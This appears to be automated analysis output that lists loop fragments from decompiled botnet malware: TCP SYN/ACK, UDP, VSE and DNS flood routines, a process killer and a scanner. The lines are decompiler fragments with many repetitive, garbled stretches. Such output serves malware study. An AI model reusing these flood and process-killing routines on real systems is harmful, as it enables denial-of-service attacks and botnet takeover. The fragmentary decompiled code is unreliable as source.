+		checksum_tcpudp(time_val, fd, addr_len, v323);
+		sendto(sock_fd, (int32_t *)time_val, v324 + 40, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+		while (true) {
+=============================WHILE LOOPS ID : 11 @ attack_tcp_ack ====================================
+++++++++ WHILE START : 9480 
+++++++++ WHILE FUNCTION : attack_tcp_ack 
+++++++++ WHILE END : 9506 
+++++++++ INTRESTING INSTRUCTIONS :  
+		rand_next();
+		rand_str((int32_t *)(v328 + 40), v319);
+=============================WHILE LOOPS ID : 12 @ attack_tcp_ack ====================================
+++++++++ WHILE START : 9512 
+++++++++ WHILE FUNCTION : attack_tcp_ack 
+++++++++ WHILE END : 9710 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		result = close(sock_fd);
+		result = close(sock_fd);
+		checksum_tcpudp(message, v333 + 20, v352, v332);
+		sendto(sock_fd, (int32_t *)message, v319 + 40, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+		while (true) {
+=============================WHILE LOOPS ID : 13 @ attack_tcp_syn ====================================
+++++++++ WHILE START : 10070 
+++++++++ WHILE FUNCTION : attack_tcp_syn 
+++++++++ WHILE END : 10091 
+++++++++ INTRESTING INSTRUCTIONS :  
+		rand_next();
+		rand_next();
+=============================WHILE LOOPS ID : 14 @ attack_tcp_syn ====================================
+++++++++ WHILE START : 10094 
+++++++++ WHILE FUNCTION : attack_tcp_syn 
+++++++++ WHILE END : 10307 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		result = close(sock_fd);
+		result = close(sock_fd);
+		checksum_tcpudp(message, v339 + 20, 0x2800, 40);
+		sendto(sock_fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+		while (true) {
+=============================WHILE LOOPS ID : 17 @ attack_udp_plain ====================================
+++++++++ WHILE START : 10731 
+++++++++ WHILE FUNCTION : attack_udp_plain 
+++++++++ WHILE END : 10793 
+++++++++ INTRESTING INSTRUCTIONS :  
+		int32_t sock2; // 0x407700
+		connect(sock2, (struct sockaddr *)16, 16);
+		while (true) {
+		int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_UDP); // 0x407764
+		result2 = sock_fd;
+		if (sock_fd != -1) {
+		bind(sock_fd, (struct sockaddr *)&addr, 16);
+		int32_t v325 = rand_next(); // 0x4077d0
+		int32_t sock3; // 0x407840
+		connect(sock3, (struct sockaddr *)addr2, 16);
+=============================WHILE LOOPS ID : 18 @ attack_udp_generic ====================================
+++++++++ WHILE START : 11203 
+++++++++ WHILE FUNCTION : attack_udp_generic 
+++++++++ WHILE END : 11424 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		checksum_tcpudp(message, v349, (int32_t)v356, v324);
+		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+		checksum_tcpudp(message, v349, (int32_t)v356, v324);
+		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+		result2 = close(sock_fd);
+		while (true) {
+=============================WHILE LOOPS ID : 20 @ attack_udp_vse ====================================
+++++++++ WHILE START : 11808 
+++++++++ WHILE FUNCTION : attack_udp_vse 
+++++++++ WHILE END : 11982 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		result = close(sock_fd);
+		result = close(sock_fd);
+		checksum_tcpudp(message, v334 + 20, (int32_t)v341, v315 + 12);
+		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+		result = close(sock_fd);
+		while (true) {
+=============================WHILE LOOPS ID : 22 @ attack_udp_dns ====================================
+++++++++ WHILE START : 12386 
+++++++++ WHILE FUNCTION : attack_udp_dns 
+++++++++ WHILE END : 13151 
+++++++++ INTRESTING INSTRUCTIONS :  
+		result = inet_addr((char *)cp);
+		sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+		if (sock_fd == fd) {
+		result2 = setsockopt(sock_fd, 0, 3, &option_value, 4);
+		sock = sock_fd;
+		while (true) {
+		while (true) {
+		result = inet_addr((char *)cp);
+		sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+		if (sock_fd == fd) {
+		result2 = setsockopt(sock_fd, 0, 3, &option_value, 4);
+		sock = sock_fd;
+		while (true) {
+		while (true) {
+		while (true) {
+		sock = sock_fd;
+		while (true) {
+		while (true) {
+		while (true) {
+		checksum_tcpudp(fd, v392 + 20, (int32_t)v403, v315 + 27);
+		sendto(sock, (int32_t *)fd, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+		while (true) {
+		int32_t v411 = sock;
+		sock = sock_fd;
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+		while (true) {
+		case 32: {
+		case 9: {
+=============================WHILE LOOPS ID : 32 @ killer_kill_by_port ====================================
+++++++++ WHILE START : 14877 
+++++++++ WHILE FUNCTION : killer_kill_by_port 
+++++++++ WHILE END : 15447 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		close(fd2);
+		struct __dirstream * v340 = opendir((char *)table_retrieve_val(6, NULL)); // 0x409360
+		while (true) {
+		while (true) {
+		struct __dirstream * v364 = opendir((char *)&path2); // 0x409530
+		while (true) {
+		while (true) {
+		kill(util_atoi((int64_t)v380, 10), SIGKILL);
+		struct dirent * v381 = readdir((struct __dirstream *)fd2); // 0x40971c
+		closedir((struct __dirstream *)fd2);
+		v368 = readdir((struct __dirstream *)dirp);
+		closedir((struct __dirstream *)fd2);
+		v368 = readdir((struct __dirstream *)dirp);
+		v355 = closedir((struct __dirstream *)dirp2);
+		while (true) {
+		v314 = close(fd3);
+		v355 = closedir((struct __dirstream *)dirp2);
+		closedir((struct __dirstream *)dirp);
+=============================WHILE LOOPS ID : 35 @ killer_init ====================================
+++++++++ WHILE START : 16115 
+++++++++ WHILE FUNCTION : killer_init 
+++++++++ WHILE END : 16876 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		struct dirent * v361 = readdir((struct __dirstream *)&dirp); // 0x409ce4
+		int32_t v363 = closedir((struct __dirstream *)&dirp); // 0x409d04
+		kill(time_val, SIGKILL);
+		int32_t pid = getpid(); // 0x409f44
+		int32_t ppid = getppid(); // 0x409f60
+		fd = open((char *)&dirp, O_RDONLY);
+		close(fd4);
+		close(fd);
+		fd2 = open((char *)&path, O_RDONLY);
+		while (true) {
+		close(fd4);
+		v344 = close(fd5);
+		fd2 = open((char *)&path, O_RDONLY);
+		close(fd4);
+		close(fd4);
+		kill(time_val, SIGKILL);
+		while (true) {
+		while (true) {
+		v344 = close(fd5);
+		while (true) {
+		v344 = close(fd5);
+		while (true) {
+		v344 = close(fd5);
+		close(fd4);
+		result = close(fd6);
+		int32_t v438 = kill(pid3, SIGKILL); // 0x40a3b8
+		close(fd4);
+		kill(time_val, SIGKILL);
+		close(fd4);
+		close(fd4);
+		closedir((struct __dirstream *)&dirp);
+=============================WHILE LOOPS ID : 36 @ main ====================================
+++++++++ WHILE START : 17656 
+++++++++ WHILE FUNCTION : main 
+++++++++ WHILE END : 17882 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		int32_t sock2;
+		if (sock2 == -1) {
+		if (v331 == sock2) {
+		int32_t * v332 = (int32_t *)(v303 + 4 * sock2 / 32 + 428); // 0x40b2b4
+		*v332 = *v332 | 1 << sock2;
+		int32_t * v333 = (int32_t *)(v303 + 4 * sock2 / 32 + 172); // 0x40b144
+		*v333 = *v333 | 1 << sock2;
+		if (v323 < sock2) {
+		if (sock2 != fd4) {
+		fcntl(fd3, F_GETFL);
+		int32_t sock; // 0x40b488
+		connect(sock, addr, 16);
+		send(sock2, (int32_t *)&buf3, 2, MSG_NOSIGNAL);
+		getsockopt(0xffff, 0x1007, (int32_t)&option_name, &option_name, &option_len);
+		close(fd5);
+		int32_t v338 = rand_next(); // 0x40b524
+		int32_t sock3; // bp-1612
+		accept((int32_t)&sock3, (struct sockaddr *)&option_name, &option_name);
+		scanner_kill();
+		killer_kill();
+		attack_kill_all();
+		kill(-v311, SIGKILL);
+		int32_t sock4; // 0x40b628
+		send(sock4, &buf4, 4, MSG_NOSIGNAL);
+		int32_t sock5; // 0x40b650
+		send(sock5, (int32_t *)&buf3, 1, MSG_NOSIGNAL);
+		case 11: {
+		while (true) {
+		int32_t sock6; // 0x40b67c
+		int32_t v346 = send(sock6, &buf5, length, MSG_NOSIGNAL); // 0x40b680
+		case 4: {
+		int32_t sock7; // 0x40b6dc
+		recv(sock7, (int32_t *)2, 0x4000, MSG_NOSIGNAL);
+		int32_t sock8; // 0x40b708
+		int32_t v355 = recv(sock8, &buf6, length2, MSG_NOSIGNAL); // 0x40b714
+		int32_t v357 = sock2; // 0x40b3b4
+=============================WHILE LOOPS ID : 43 @ rand_alphastr ====================================
+++++++++ WHILE START : 19142 
+++++++++ WHILE FUNCTION : rand_alphastr 
+++++++++ WHILE END : 19193 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 45 @ resolv_lookup ====================================
+++++++++ WHILE START : 20244 
+++++++++ WHILE FUNCTION : resolv_lookup 
+++++++++ WHILE END : 20818 
+++++++++ INTRESTING INSTRUCTIONS :  
+		int32_t v323 = rand_next(); // 0x40bc2c
+		close(fd);
+		int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x40bd04
+		if (sock_fd != v330) {
+		if (connect(sock_fd, (struct sockaddr *)&addr, 16) != v330) {
+		if (send(sock_fd, (int32_t *)&buf, length, MSG_NOSIGNAL) != v330) {
+		fcntl(3, sock_fd);
+		fcntl(4, sock_fd);
+		int32_t * v345 = (int32_t *)(4 * sock_fd / 32 + (int32_t)&v344 + 28); // 0x40bda8
+		uint32_t v346 = sock_fd % 32; // 0x40bdac
+		int32_t nfds = sock_fd + 1; // 0x40bdd8
+		while (true) {
+		while (true) {
+		int32_t v422 = recvfrom(sock_fd, (int32_t *)&buf2, 2048, MSG_NOSIGNAL, NULL, NULL); // 0x40be28
+=============================WHILE LOOPS ID : 47 @ scanner_init ====================================
+++++++++ WHILE START : 22281 
+++++++++ WHILE FUNCTION : scanner_init 
+++++++++ WHILE END : 22298 
+++++++++ INTRESTING INSTRUCTIONS :  
+		v412 = recvfrom(sock2, buf, 1514, MSG_NOSIGNAL, NULL, NULL);
+=============================WHILE LOOPS ID : 48 @ scanner_init ====================================
+++++++++ WHILE START : 22799 
+++++++++ WHILE FUNCTION : scanner_init 
+++++++++ WHILE END : 22903 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (v467 != sock3) {
+=============================WHILE LOOPS ID : 51 @ scanner_init ====================================
+++++++++ WHILE START : 23649 
+++++++++ WHILE FUNCTION : scanner_init 
+++++++++ WHILE END : 24727 
+++++++++ INTRESTING INSTRUCTIONS :  
+		sock3 = 251;
+		send(sock4, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+		int32_t sock5; // 0x40d9b0
+		send(sock5, (int32_t *)buf7, (int32_t)length3, MSG_NOSIGNAL);
+		int32_t sock6; // 0x40d9c4
+		send(sock6, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+		int32_t sock7; // 0x40da90
+		send(sock7, (int32_t *)table_retrieve_val(21, v1012), length4, MSG_NOSIGNAL);
+		int32_t sock8; // 0x40daac
+		send(sock8, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+		int32_t sock9; // 0x40db90
+		send(sock9, (int32_t *)buf8, buf3, MSG_NOSIGNAL);
+		int32_t sock10; // 0x40dbac
+		send(sock10, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+		int32_t sock11; // 0x40dc90
+		send(sock11, (int32_t *)table_retrieve_val(24, v1012), length4, MSG_NOSIGNAL);
+		int32_t sock12; // 0x40dcac
+		send(sock12, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+		int32_t sock13; // 0x40dd90
+		send(sock13, (int32_t *)buf9, buf3, MSG_NOSIGNAL);
+		int32_t sock14; // 0x40ddac
+		send(sock14, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+		int32_t v1055 = fork(); // 0x40def4
+		v1004 = sock6;
+		v980 = sock4;
+=============================WHILE LOOPS ID : 52 @ scanner_init ====================================
+++++++++ WHILE START : 25631 
+++++++++ WHILE FUNCTION : scanner_init 
+++++++++ WHILE END : 25651 
+++++++++ INTRESTING INSTRUCTIONS :  
+		v412 = recvfrom(sock2, buf, 1514, MSG_NOSIGNAL, NULL, NULL);
+=============================WHILE LOOPS ID : 54 @ util_memsearch ====================================
+++++++++ WHILE START : 29117 
+++++++++ WHILE FUNCTION : util_memsearch 
+++++++++ WHILE END : 29149 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 55 @ util_atoi ====================================
+++++++++ WHILE START : 29469 
+++++++++ WHILE FUNCTION : util_atoi 
+++++++++ WHILE END : 29848 
+++++++++ INTRESTING INSTRUCTIONS :  
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		while (true) {
+		case 32: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+		case 9: {
+=============================WHILE LOOPS ID : 57 @ util_stristr ====================================
+++++++++ WHILE START : 30878 
+++++++++ WHILE FUNCTION : util_stristr 
+++++++++ WHILE END : 30937 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
